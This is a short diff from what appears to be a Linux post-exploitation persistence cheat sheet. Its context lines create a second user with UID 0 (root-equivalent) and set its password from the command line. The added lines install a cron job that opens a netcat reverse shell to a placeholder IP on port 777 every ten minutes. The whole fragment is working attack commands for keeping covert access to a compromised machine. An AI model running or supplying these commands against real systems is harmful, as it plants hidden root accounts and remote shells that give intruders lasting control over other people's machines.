@@ -9,3 +9,7 @@ passwd admin
 sudo useradd -ou 0 -g 0 john
 sudo passwd john
 echo "linuxpassword" | passwd --stdin john
+
+# Cron Tab Persistence (every 10 minutes)
+crontab -e
+0-59/10 * * * * nc <IP> 777 -e /bin/bash
